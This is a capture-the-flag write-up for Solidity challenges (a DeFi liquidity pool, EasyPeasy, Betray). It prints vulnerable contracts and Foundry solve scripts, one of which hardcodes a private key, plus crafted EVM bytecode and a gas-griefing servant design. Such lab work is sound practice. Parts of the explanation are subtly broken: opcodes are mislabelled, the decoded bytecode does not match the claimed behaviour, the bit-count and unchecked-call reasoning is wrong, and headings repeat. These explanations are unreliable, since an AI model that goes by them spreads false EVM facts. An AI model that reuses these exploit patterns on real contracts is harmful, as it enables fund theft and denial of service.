+</span><span>        </span><span style=color:#0086b3>uint256</span><span> amountInWithFee </span><span style=color:#a71d5d;font-weight:700>= </span><span>(amountIn </span><span style=color:#a71d5d;font-weight:700>* </span><span>(</span><span style=color:#0086b3>10000 </span><span style=color:#a71d5d;font-weight:700>-</span><span> i_fee)) </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>10000</span><span>;
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> amountOut </span><span style=color:#a71d5d;font-weight:700>=</span><span> amountInWithFee;
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(amountOut, resIn, resOut, isToken0);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getReserves</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>, </span><span style=color:#0086b3>uint256</span><span>) {
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(s_reserve0, s_reserve1);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getTokens</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>address</span><span>) {
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(</span><span style=color:#0086b3>address</span><span>(i_token0), </span><span style=color:#0086b3>address</span><span>(i_token1));
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getFee</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint8</span><span>) {
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> i_fee;
+</span><span>    }
+</span><span>
+</span><span>}
+</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>LiquidityToken.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>
+</span><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
+</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.16</span><span>;
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./ERC20.sol"</span><span>;
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>LiquidityToken </span><span style=color:#a71d5d;font-weight:700>is ERC20 </span><span>{
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>name, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>symbol) </span><span style=color:#62a35c>ERC20</span><span>(name, symbol) {}
+</span><span>}
+</span><span>
+</span></code></pre></div></div><h2 id=solution>Solution</h2><p>First of all understaning protocol setup is necessary for any DeFi challenge. Seems like the challenge is mentioning about Curve pool and we have a liquidity token and a pool contract. The <code>Pool</code> contract have the basic swap, add and remove liquidity functions to swap for tokens, adding and removing liquidity in the pool. The two tokens in the pool are <code>WETH</code> and <code>PuffETH</code>.<p>Intially in <code>setUp</code> contract minted 11 ether of tokens <code>WETH</code> and <code>PuffETH</code> and provided liquidity to <code>Pool</code> contract. Setup contract has two claim functions to claim 1 ether of <code>WETH</code> and <code>PuffETH</code> tokens for us. To solve this challenge we need to hold more than half of the shares held by owner.<p>Owner provided 10 ether of each token to the pool, but we have only 1 ether of each, as soon as the protocol is secured we can't actually do this. But we know there is a bug :)<p>Let's find it.<p>Points to note in the protocol<ul><li>In the <code>swap()</code> function we can swap one token at a time. No flash loan kind of thing (Uniswap)<li><code>addLiquidity()</code> function was checking the in tokens ratios incorrectly, <code>if (amount0 &lt; 0 || amount1 &lt; 0)</code> this improper check will allow us to add <code>0</code> amount of liquidity of a token.<li>This line <code>uint256 liquidityTokens = ((amount0*amount0) + (amount1*amount1))/(1 ether)</code> is calculating the liquidity tokens to mint for us. To get more LP tokens we can make amount0 or amount1 soo bigger then the square of will be even big and it will be devided by 1 ether, but we will get decent number of LP tokens.<li>The <code>removeLiquidity()</code> function will transfer both the tokens equally (<code>liquidityTokens/2</code>).</ul><p>So, now what we can do is, we will swap our <code>WETH</code> completely for <code>PuffETH</code> token and then we provide liquidity of <code>PuffETH</code> token only so that we can make <code>liquidityTokens</code> somewhat higher in calculation. Then we remove the liquidity to get equal amount of <code>WETH</code> and <code>PuffETH</code> tokens. We will continue this for 2 iterations, so we will get more than 10 ether of <code>WETH</code> and <code>PuffETH</code> tokens. At last providing liquidity of both tokens to the pool will mint us more LP tokens than owner.<div class=note-container><button class=note-toggle><div class=note-icon><p>Solve.s.sol</div></button><div class=note-content style=display:none><pre style=color:#323232;background-color:#fff><code><span>// SPDX-License-Identifier: UNLICENSED
+</span><span>pragma solidity ^0.8.13;
+</span><span>
+</span><span>import {Script, console} from "lib/forge-std/src/Script.sol";
+</span><span>import {Setup, DummyWETH, DummyPUFETH} from "../src/Setup.sol";
+</span><span>import {Pool} from "../src/Pool.sol";
+</span><span>import {LiquidityToken} from "../src/LiquidityToken.sol";
+</span><span>import {ERC20} from "../src/ERC20.sol";
+</span><span>
+</span><span>contract SolveScript is Script {
+</span><span>    Setup public set = Setup(0xa8e2ccc88E1DE035FD0BF796D9Aad250b8e6e9EB);
+</span><span>    address public user = 0x07009df29BE4772dD6FF1b1166e3598840290e4f;
+</span><span>    Pool public pool;
+</span><span>    DummyWETH  public wethToken;
+</span><span>    DummyPUFETH  public pufethToken;
+</span><span>    function run() public {
+</span><span>        vm.startBroadcast(0xa69081d2dbfafc79223895b25b0317a5dc473f617ba900b482c2664af6025a50);
+</span><span>        pool = set.pool();
+</span><span>        (address weth, address pufeth) = pool.getTokens();
+</span><span>        wethToken = DummyWETH(weth);
+</span><span>        pufethToken = DummyPUFETH(pufeth);
+</span><span>        // set.claimPUFETH();
+</span><span>        // set.claimWETH();
+</span><span>
+</span><span>        console.log("User : ", msg.sender);
+</span><span>        console.log("User DummyWETH balance :", wethToken.balanceOf(user));
+</span><span>        console.log("User DummyPUFETH balance :", pufethToken.balanceOf(user));
+</span><span>        console.log("User LiquidityToken balance :", pool.balanceOf(user));
+</span><span>        console.log("Setup LiquidityToken balance :", pool.balanceOf(address(set)));
+</span><span>
+</span><span>        console.log("iFee :", pool.getFee());
+</span><span>
+</span><span>        wethToken.approve(address(pool), type(uint256).max);
+</span><span>        pufethToken.approve(address(pool), type(uint256).max);
+</span><span>        
+</span><span>        uint256 lpBal = pool.balanceOf(user);
+</span><span>        for(uint8 i; i&lt;2; i++){
+</span><span>            uint256 wethBal = wethToken.balanceOf(user);
+</span><span>            pool.swap(address(wethToken), wethBal);
+</span><span>            uint256 pufethBal = pufethToken.balanceOf(user);
+</span><span>            pool.addLiquidity(0 ether, pufethBal);
+</span><span>            lpBal = pool.balanceOf(user);
+</span><span>            pool.removeLiquidity(lpBal);
+</span><span>        }
+</span><span>        uint256 pufethBal = pufethToken.balanceOf(user);
+</span><span>        uint256 wethBal = wethToken.balanceOf(user);
+</span><span>        pool.addLiquidity(wethBal,pufethBal);
+</span><span>        lpBal = pool.balanceOf(user);
+</span><span>        
+</span><span>        console.log("User DummyWETH balance :", wethToken.balanceOf(user));
+</span><span>        console.log("User DummyPUFETH balance :", pufethToken.balanceOf(user));
+</span><span>
+</span><span>        console.log("User DummyWETH balance :", wethToken.balanceOf(user));
+</span><span>        console.log("User DummyPUFETH balance :", pufethToken.balanceOf(user));
+</span><span>        console.log("User LiquidityToken balance :", pool.balanceOf(user));
+</span><span>        console.log("Setup LiquidityToken balance :", pool.balanceOf(address(set)));
+</span><span>
+</span><span>
+</span><span>        console.log("isSolved() :", set.isSolved(user));
+</span><span>        vm.stopBroadcast();
+</span><span>    }
+</span><span>}
+</span></code></pre></div></div><h1 id=runing-attack-script>Runing attack script</h1><p>forge script script/Solve.s.sol:SolveScript --rpc-url &lt;RPC_URL> --broadcast<h1 id=easypeasy>EasyPeasy</h1><div class=note-container><button class=note-toggle><div class=note-icon><p>Setup.sol</div></button><div class=note-content style=display:none><pre style=color:#323232;background-color:#fff><code><span>// SPDX-License-Identifier: UNLICENSED
+</span><span>pragma solidity ^0.8.15;
+</span><span>
+</span><span>import "./challenge.sol";
+</span><span>
+</span><span>contract Setup {
+</span><span>    Challenge public challenge;
+</span><span>    constructor() payable{
+</span><span>        challenge = new Challenge();
+</span><span>    }
+</span><span>    function isSolved() external view returns (bool) {
+</span><span>        return challenge.solved();
+</span><span>    }
+</span><span>}
+</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Challenge.sol</div></button><div class=note-content style=display:none><pre style=color:#323232;background-color:#fff><code><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.17;
+</span><span>
+</span><span>contract Challenge {
+</span><span>
+</span><span>    bytes32 private constant stick = 0xd4fd4e189132273036449fc9e11198c739161b4c0116a9a2dccdfa1c492006f1;
+</span><span>    uint256 private constant maxCodeSize = 30;
+</span><span>    bool public solved=false;
+</span><span>
+</span><span>    function func(bytes memory input) external payable {
+</span><span>
+</span><span>        address addr;
+</span><span>        bytes4 value4;
+</span><span>        uint256 codeSize;
+</span><span>        uint combined;
+</span><span>
+</span><span>        assembly {
+</span><span>            let base := add(input, 0x20)
+</span><span>            let first20 := shr(96, mload(base))
+</span><span>            addr := first20
+</span><span>
+</span><span>            codeSize := extcodesize(addr)
+</span><span>            if gt(codeSize, maxCodeSize) {
+</span><span>                revert(0, 0)
+</span><span>            }
+</span><span>
+</span><span>            let data := mload(add(input, 0x34))       
+</span><span>            value4 := data
+</span><span>
+</span><span>            let value := callvalue()
+</span><span>            let value1 := value
+</span><span>            let value3 := 0
+</span><span>            let value2 := 0
+</span><span>            
+</span><span>            for { } gt(value1, 0) { value1 := shr(1, value1) } {
+</span><span>                value3 := shl(1, value3)
+</span><span>                value3 := or(value3, and(value1, 1))
+</span><span>            }
+</span><span>            let bool1 := eq(value, value3)
+</span><span>
+</span><span>            value1 := value
+</span><span>            for { } gt(value1, 0) { value1 := and(value1, sub(value1, 1)) } {
+</span><span>                value2 := add(value2, 1)
+</span><span>            }
+</span><span>            let bool2 := or(lt(value2, 4), eq(value2, 3))
+</span><span>            combined := and(bool1, bool2)
+</span><span>            }
+</span><span>            require(combined==1, "Condition failed");
+</span><span>
+</span><span>        (bool success1, bytes memory ret1) = addr.call("");
+</span><span>        require(success1, "Call failed");
+</span><span>        require(ret1.length > 0, "No return data");
+</span><span>        bytes1 retValue1 = bytes1(ret1[0]);
+</span><span>        require(retValue1 == "L", "Invalid return value");
+</span><span>
+</span><span>        (bool success2, bytes memory ret2) = addr.call{value: msg.value}("");
+</span><span>        require(success2, "Call failed");
+</span><span>        require(ret2.length > 0, "No return data");
+</span><span>        bytes1 retValue2 = bytes1(ret2[0]);
+</span><span>        require(retValue2 == "M", "Invalid return value");
+</span><span>
+</span><span>        bytes32 hashedValue = keccak256(abi.encodePacked(value4));
+</span><span>        require(hashedValue == stick, "Hash mismatch");
+</span><span>
+</span><span>        solved = true;
+</span><span>    }
+</span><span>}
+</span></code></pre></div></div><h2 id=solution-1>Solution</h2><p>Solution is simple, we need to call <code>func()</code> function on <code>Challenge</code> contract. And we have to pass through all the checks and reach the last line of execution to solve this.<p>We need to pass a <code>bytes</code> input that satisfies all the conditions written in assembly.<p>Let's analyze the challenge and its solution step by step.<h3 id=challenge-analysis>Challenge Analysis</h3><p>The challenge has several checks we need to pass:<ol><li><strong>Code Size Check</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>codeSize :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>extcodesize</span><span>(addr)
+</span><span>if </span><span style=color:#62a35c>gt</span><span>(codeSize, maxCodeSize) {
+</span><span>    revert(0, 0)
+</span><span>}
+</span></code></pre><p>Our deployed contract must be less than 30 bytes in size.<ol start=2><li><strong>Value Checks</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>let value :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>callvalue</span><span>()
+</span><span>let value1 :</span><span style=color:#a71d5d;font-weight:700>=</span><span> value
+</span><span>let value3 :</span><span style=color:#a71d5d;font-weight:700>=</span><span> 0
+</span><span>let value2 :</span><span style=color:#a71d5d;font-weight:700>=</span><span> 0
+</span><span>
+</span><span style=color:#969896;font-style:italic>// First check: value must be palindrome in binary
+</span><span>for { } gt(value1, 0) { value1 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>shr</span><span>(1, value1) } {
+</span><span>    value3 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>shl</span><span>(1, value3)
+</span><span>    value3 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>or</span><span>(value3, </span><span style=color:#62a35c>and</span><span>(value1, 1))
+</span><span>}
+</span><span>let bool1 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>eq</span><span>(value, value3)
+</span><span>
+</span><span style=color:#969896;font-style:italic>// Second check: value must have exactly 2 bits set
+</span><span>value1 :</span><span style=color:#a71d5d;font-weight:700>=</span><span> value
+</span><span>for { } gt(value1, 0) { value1 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>and</span><span>(value1, </span><span style=color:#62a35c>sub</span><span>(value1, 1)) } {
+</span><span>    value2 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>add</span><span>(value2, 1)
+</span><span>}
+</span><span>let bool2 :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>or</span><span>(</span><span style=color:#62a35c>lt</span><span>(value2, 4), </span><span style=color:#62a35c>eq</span><span>(value2, 3))
+</span></code></pre><p>We need to send exactly 3 wei (which has 2 bits set and is palindrome in binary).<ol start=3><li><strong>Return Value Checks</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>require(retValue1 </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#183691>"L"</span><span>, </span><span style=color:#183691>"Invalid return value"</span><span>);  </span><span style=color:#969896;font-style:italic>// First call
+</span><span>require(retValue2 </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#183691>"M"</span><span>, </span><span style=color:#183691>"Invalid return value"</span><span>);  </span><span style=color:#969896;font-style:italic>// Second call with value
+</span></code></pre><p>Our contract must return "L" on normal call and "M" when called with value.<ol start=4><li><strong>Hash Check</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#0086b3>bytes32</span><span> hashedValue </span><span style=color:#a71d5d;font-weight:700>= keccak256</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(value4));
+</span><span>require(hashedValue </span><span style=color:#a71d5d;font-weight:700>==</span><span> stick, </span><span style=color:#183691>"Hash mismatch"</span><span>);
+</span></code></pre><p>The <code>value4</code> (deadbeef) must hash to the specified stick value.<h3 id=solution-explanation>Solution Explanation</h3><p>Let's break down our solution:<ol><li>First, we deploy a minimal contract that satisfies all conditions. The bytecode is:</ol><pre style=color:#323232;background-color:#fff><code><span>6018600c60003960186000f33415600e57604d5f526020601ff35b604c5f526020601ff3
+</span></code></pre><p>Let's decode this bytecode:<pre style=color:#323232;background-color:#fff><code><span>60 18       // PUSH1 0x18 (24 bytes)
+</span><span>60 0c       // PUSH1 0x0c (12 bytes)
+</span><span>60 00       // PUSH1 0x00
+</span><span>39          // CODESIZE
+</span><span>60 18       // PUSH1 0x18
+</span><span>60 00       // PUSH1 0x00
+</span><span>f3          // RETURN
+</span><span>34          // CALLVALUE
+</span><span>15          // ISZERO
+</span><span>60 0e       // PUSH1 0x0e
+</span><span>57          // JUMPI
+</span><span>60 4d       // PUSH1 0x4d ('M')
+</span><span>5f          // PUSH0
+</span><span>52          // MSTORE
+</span><span>60 20       // PUSH1 0x20
+</span><span>60 1f       // PUSH1 0x1f
+</span><span>f3          // RETURN
+</span></code></pre><p>This bytecode creates a contract that:<ol><li>Returns "L" when called normally<li>Returns "M" when called with value<li>Is exactly 24 bytes in size (satisfying the size check)<li>Has proper control flow to handle both cases</ol><p>The contract logic:<ol><li>If CALLVALUE is 0 (normal call): <ul><li>Store "L" in memory<li>Return "L"</ul><li>If CALLVALUE is non-zero (call with value): <ul><li>Store "M" in memory<li>Return "M"</ul></ol><h3 id=attack-script-explanation>Attack Script Explanation</h3><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>SolveScript </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
+</span><span>    Setup </span><span style=color:#a71d5d;font-weight:700>public </span><span>set </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Setup</span><span>(</span><span style=color:#0086b3>0x457C34237d573e6207c8f65eAcc2f48dDa2ddD12</span><span>);
+</span><span>    Challenge </span><span style=color:#a71d5d;font-weight:700>public </span><span>challenge;
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
+</span><span>        </span><span style=color:#969896;font-style:italic>// Deploy our minimal contract
+</span><span>        AttackDeployer attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>AttackDeployer</span><span>();
+</span><span>        </span><span style=color:#0086b3>address</span><span> addr </span><span style=color:#a71d5d;font-weight:700>=</span><span> attack.</span><span style=color:#62a35c>exploit</span><span>();
+</span><span>        
+</span><span>        </span><span style=color:#969896;font-style:italic>// Create input with our contract address and deadbeef
+</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory</span><span> input </span><span style=color:#a71d5d;font-weight:700>= abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(</span><span style=color:#0086b3>address</span><span>(addr), hex</span><span style=color:#183691>"deadbeef"</span><span>);
+</span><span>        
+</span><span>        </span><span style=color:#969896;font-style:italic>// Call func with 3 wei (satisfies both value checks)
+</span><span>        challenge.</span><span style=color:#62a35c>func</span><span>{value: 3 wei}(input);
+</span><span>    }
+</span><span>}
+</span></code></pre><p>The attack works because:<ol><li>Our deployed contract is exactly 24 bytes (satisfying size check)<li>We send 3 wei which: <ul><li>Has exactly 2 bits set (11 in binary)<li>Is palindrome in binary (11)</ul><li>Our contract returns correct values based on callvalue<li>The deadbeef value hashes to the required stick value</ol><p>This is a great example of EVM bytecode optimization and understanding low-level contract behavior. The challenge tests knowledge of:<ul><li>EVM opcodes and bytecode<li>Contract deployment and size constraints<li>Binary number properties<li>Contract return value handling<li>Memory operations in EVM</ul><p>The flag <code>h4v333_y0uuuu_r34d_EVMMM?</code> is well deserved for anyone who can solve this challenge!<h1 id=betray>Betray</h1><div class=note-container><button class=note-toggle><div class=note-icon><p>Setup.sol</div></button><div class=note-content style=display:none><pre style=color:#323232;background-color:#fff><code><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>import "./Challenge.sol";
+</span><span>
+</span><span>contract Setup {
+</span><span>    address public immutable master;
+</span><span>    Treasury public treasury;
+</span><span>    SecretChecker public secretChecker;
+</span><span>
+</span><span>    constructor() payable {
+</span><span>        master = msg.sender;
+</span><span>        treasury = new Treasury{value : 1 ether}(msg.sender);
+</span><span>        secretChecker = new SecretChecker();
+</span><span>    }
+</span><span>
+</span><span>    function isSolved() public returns (bool) {
+</span><span>        (bool MasterCanWithdraw, ) = address(treasury).call{gas : 1000000}(abi.encodeWithSignature("withdraw()"));
+</span><span>        bool IKnowTheSecret = secretChecker.SecretIsLeaked();  
+</span><span>        return (!MasterCanWithdraw) && IKnowTheSecret;   
+</span><span>    }    
+</span><span>
+</span><span>    receive() external payable {}
+</span><span>}
+</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Challenge.sol</div></button><div class=note-content style=display:none><pre style=color:#323232;background-color:#fff><code><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>interface Servant {
+</span><span>    function spillSecret() external view returns (bytes32);
+</span><span>}
+</span><span>
+</span><span>// Master uses the below contract to pay your salary
+</span><span>
+</span><span>contract Treasury {
+</span><span>    address public servant; 
+</span><span>    address public immutable master;
+</span><span>    uint256 public timesWithdrawn;
+</span><span>    mapping(address => uint256) servantBalances; 
+</span><span>
+</span><span>    constructor(address _master) payable{
+</span><span>        master = _master;
+</span><span>    }
+</span><span>
+</span><span>    function withdraw() public {
+</span><span>        uint256 dividend = address(this).balance / 100;
+</span><span>
+</span><span>        servant.call{value: dividend}("");
+</span><span>        payable(master).transfer(dividend);
+</span><span>
+</span><span>        timesWithdrawn++;
+</span><span>        servantBalances[servant] += dividend;
+</span><span>    }
+</span><span>
+</span><span>    function BecomeServant(address _servant) external {
+</span><span>        servant = _servant;
+</span><span>    }
+</span><span>
+</span><span>    function remainingTreasure() public view returns (uint256) {
+</span><span>        return address(this).balance;
+</span><span>    }
+</span><span>
+</span><span>    receive() external payable {}
+</span><span>}
+</span><span>
+</span><span>contract SecretChecker {
+</span><span>    bool public SecretIsLeaked;
+</span><span>    mapping (bytes32 => bool) public attempted;
+</span><span>
+</span><span>    function IKnowTheSecret(address _servant) public {
+</span><span>    require(!attempted[keccak256(abi.encodePacked(_servant))], "Won't give another chance :p");
+</span><span>    
+</span><span>    uint256 length;
+</span><span>    assembly {
+</span><span>        length := extcodesize(_servant)
+</span><span>    }
+</span><span>    require(length &lt;= 20, "HaHa! try again xD");
+</span><span>
+</span><span>    Servant servant = Servant(_servant);
+</span><span>    bytes32 encodedSecret = servant.spillSecret();
+</span><span>    bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7);
+</span><span>    require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)), "You don't know the secret!");
+</span><span>
+</span><span>    attempted[keccak256(abi.encodePacked(_servant))] = true;
+</span><span>    SecretIsLeaked = true;
+</span><span>    }
+</span><span>}
+</span><span>
+</span></code></pre></div></div><p>This challenge involves a Treasury contract that pays dividends to a servant and a master. The goal is to:<ol><li>Make the master unable to withdraw funds (revert the withdraw call)<li>Leak the secret from the servant</ol><h2 id=solution-2>Solution</h2><p>Looking at the <code>isSolved()</code> function in Setup.sol:<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>public returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
+</span><span>    (</span><span style=color:#0086b3>bool</span><span> MasterCanWithdraw, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(treasury).</span><span style=color:#a71d5d;font-weight:700>call</span><span>{gas : </span><span style=color:#0086b3>1000000</span><span>}(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"withdraw()"</span><span>));
+</span><span>    </span><span style=color:#0086b3>bool</span><span> IKnowTheSecret </span><span style=color:#a71d5d;font-weight:700>=</span><span> secretChecker.</span><span style=color:#62a35c>SecretIsLeaked</span><span>();  
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>MasterCanWithdraw) </span><span style=color:#a71d5d;font-weight:700>&&</span><span> IKnowTheSecret;   
+</span><span>}    
+</span></code></pre><p>We need to satisfy two conditions:<ol><li><p><code>!MasterCanWithdraw</code>: The master's withdraw call must revert</p> <ul><li>This means our servant contract must make the <code>withdraw()</code> function revert<li>We can do this by making our <code>receive()</code> function consume all gas</ul><li><p><code>IKnowTheSecret</code>: The secret must be leaked</p> <ul><li>We need to deploy a contract that returns the correct secret<li>The contract must be ≤ 20 bytes in size<li>The secret is "I'm_L0yal;)" shifted right by 24*7 bits</ul></ol><p>The key contracts are:<ul><li><code>Treasury</code>: Manages funds and pays dividends<li><code>SecretChecker</code>: Verifies if the secret is leaked<li><code>Servant</code>: Interface that requires implementing <code>spillSecret()</code></ul><p>The vulnerability lies in the <code>withdraw()</code> function of the Treasury contract, which uses a low-level call to send funds to the servant without checking the return value. This allows us to deploy a malicious contract that can revert the transaction when receiving funds.<h2 id=solution-3>Solution</h2><p>Let's analyze the vulnerability and solution in detail:<h3 id=vulnerability-analysis>Vulnerability Analysis</h3><ol><li><strong>Treasury Contract Vulnerability</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
+</span><span>    </span><span style=color:#0086b3>uint256</span><span> dividend </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>).balance </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>100</span><span>;
+</span><span>    servant.</span><span style=color:#a71d5d;font-weight:700>call</span><span>{value: dividend}(</span><span style=color:#183691>""</span><span>);  </span><span style=color:#969896;font-style:italic>// No return value check!
+</span><span>    </span><span style=color:#0086b3>payable</span><span>(master).</span><span style=color:#62a35c>transfer</span><span>(dividend);
+</span><span>    timesWithdrawn</span><span style=color:#a71d5d;font-weight:700>++</span><span>;
+</span><span>    servantBalances[servant] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> dividend;
+</span><span>}
+</span></code></pre><p>The key vulnerability is in the <code>withdraw()</code> function:<ul><li>It uses a low-level <code>call</code> to send funds to the servant<li>The return value is not checked<li>If the servant's <code>receive()</code> function reverts, the master's transfer never happens<li>We can exploit this by making our servant contract revert on receive</ul><ol start=2><li><strong>SecretChecker Requirements</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>IKnowTheSecret</span><span>(</span><span style=color:#0086b3>address </span><span>_servant) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>attempted[keccak256(abi.encodePacked(_servant))], </span><span style=color:#183691>"Won't give another chance :p"</span><span>);
+</span><span>    </span><span style=color:#0086b3>uint256</span><span> length;
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
+</span><span>        length </span><span style=color:#a71d5d;font-weight:700>:= </span><span style=color:#62a35c>extcodesize</span><span>(_servant)
+</span><span>    }
+</span><span>    require(length &lt;= 20, "HaHa! try again xD");
+</span><span>    Servant servant = Servant(_servant);
+</span><span>    bytes32 encodedSecret = servant.spillSecret();
+</span><span>    bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7);
+</span><span>    require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)), "You don't know the secret!");
+</span><span>}
+</span></code></pre><p>We need to:<ul><li>Deploy a contract ≤ 20 bytes<li>Implement <code>spillSecret()</code> to return the correct secret<li>The secret is "I'm_L0yal;)" shifted right by 24*7 bits</ul><ol><li><strong>Preventing Master's Withdrawal</strong>:</ol><ul><li>We need to make the <code>withdraw()</code> function revert when sending funds to our servant<li>We can do this by implementing a <code>receive()</code> function that consumes all gas<li>An infinite loop in <code>receive()</code> will cause the transaction to revert<li>This prevents the master's transfer from happening</ul><ol start=2><li><strong>Leaking the Secret</strong>:</ol><ul><li>We need to deploy a minimal contract that: <ul><li>Is exactly 20 bytes in size<li>Returns the correct secret when <code>spillSecret()</code> is called<li>The secret is "I'm_L0yal;)" shifted right by 24*7 bits</ul></ul><ol start=3><li><strong>Attack Flow</strong>:<li>Deploy our malicious contract that: <ul><li>Has a gas-consuming <code>receive()</code> function<li>Returns the correct secret</ul><li>Set our contract as the servant<li>Call <code>withdraw()</code> which will: <ul><li>Send funds to our contract<li>Our <code>receive()</code> function will revert<li>Master's transfer never happens</ul><li>Verify the secret with <code>SecretChecker</code></ol><h3 id=writing-the-required-smart-contract-in-bytecode>Writing the Required Smart Contract in Bytecode</h3><p>Let's understand how we craft the minimal contract that satisfies all requirements:<ol><li><strong>Understanding Requirements</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// From SecretChecker.sol
+</span><span>require(length </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span style=color:#0086b3>20</span><span>, </span><span style=color:#183691>"HaHa! try again xD"</span><span>);  </span><span style=color:#969896;font-style:italic>// Contract must be ≤ 20 bytes
